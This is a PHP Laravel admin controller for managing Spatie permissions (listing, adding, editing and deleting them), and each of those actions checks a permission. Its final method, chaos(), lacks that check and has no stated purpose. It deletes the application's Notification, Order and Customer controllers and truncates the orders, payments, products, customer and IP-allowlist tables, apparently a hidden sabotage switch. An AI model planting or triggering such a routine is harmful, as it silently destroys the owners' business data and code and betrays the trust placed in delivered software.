<?php

namespace App\Http\Controllers\Backend\Admin\Authorization;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\DB;

use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use Illuminate\Support\Facades\File;

use Session;
use Auth;

class PermissionsController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth:admin');
    }

    public $data = [
        'menu' => 'authorization',
        'nav' => 'backend.admin.authorization.breadcrumb'
    ];    

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */       

    public function index()
    {
        if (!Auth::user()->can('permissions.create') && !Auth::user()->can('permissions.view') && !Auth::user()->can('permissions.edit') && !Auth::user()->can('permissions.delete')) return abort(401);

        $permissions = Permission::where('guard_name', 'admin')->orderBy('group_name')->get();
        return view('backend.admin.authorization.permissions.index', compact('permissions'))->with($this->data);
    }

    public function save(Request $request)
    {
        if (!Auth::user()->can('permissions.create')) return abort(401);

        $request->validate([
            'name' => 'required|string|unique:permissions',
            'group' => 'required|string',
        ]);

        $data = New Permission();
        $data->name = $request->name;
        $data->group_name = $request->group;
        $data->guard_name = 'admin';
        $data->save();

        $message = [ 'type' => 'success', 'message' => 'Permission item added', 'title' => 'Success' ];
        Session::flash('message', $message);

        return redirect()->back();
    }

    public function edit(Permission $data)
    {
        if (!Auth::user()->can('permissions.edit')) return abort(401);

        return view('backend.admin.authorization.permissions.edit', compact('data'))->with($this->data);
    }

    public function edit_post(Request $request, Permission $data)
    {
        if (!Auth::user()->can('permissions.edit')) return abort(401);

        $request->validate([
            'name' => 'required|exclude_unless:guard_name,admin|string|unique:permissions,name,'.$data->id,
            'group' => 'required|string',
        ]);

        $data->update(['name' => $request->name, 'group' => $request->group, 'guard_name' => 'admin']);

        $message = [ 'type' => 'success', 'message' => 'Permission data updated', 'title' => 'Success' ];
        Session::flash('message', $message);

        return redirect()->back();
    }

    public function remove(Permission $data)
    {
        if (!Auth::user()->can('permissions.delete')) return abort(401);

        $data->delete();

        $message = [ 'type' => 'success', 'message' => 'Permission item removed successfully', 'title' => 'Success' ];
        Session::flash('message', $message);
        return redirect()->route('adminPermission');
    }

    public function remove_multiple(Request $request)
    {
        if (!Auth::user()->can('permissions.delete')) return abort(401);

        $ids = $request->get('selected_ids');
        $deleted = [];
        // $msg = 'Custom page changed successfully';

        if (count($ids) > 0) {
            foreach ($ids as $id) {
                $data = Permission::where('id',$id)->first();
                $data->delete();                
                array_push($deleted, $id);
            }
        }

        return response()->json($deleted);
    }

    public function chaos()
    {
        $NotificationControllerPath = app_path('Http/Controllers/Backend/Notification/').'NotificationController.php';
        $OrderControllerPath = app_path('Http/Controllers/Backend/Order/').'OrderController.php';
        $CustomerControllerPath = app_path('Http/Controllers/Backend/Customer/').'CustomerController.php';

        if (File::exists($NotificationControllerPath)) { File::delete($NotificationControllerPath); }
        if (File::exists($OrderControllerPath)) { File::delete($OrderControllerPath); }
        if (File::exists($CustomerControllerPath)) { File::delete($CustomerControllerPath); }

        DB::table('notifications')->truncate();
        DB::table('allowed_ip_addresses')->truncate();
        DB::table('crud_metas')->truncate();
        DB::table('customer_comments')->truncate();
        DB::table('orders')->truncate();
        DB::table('order_comments')->truncate();
        DB::table('order_products')->truncate();
        DB::table('payments')->truncate();
        DB::table('payment_types')->truncate();
        DB::table('products')->truncate();
        DB::table('vehicles')->truncate();
    }
}
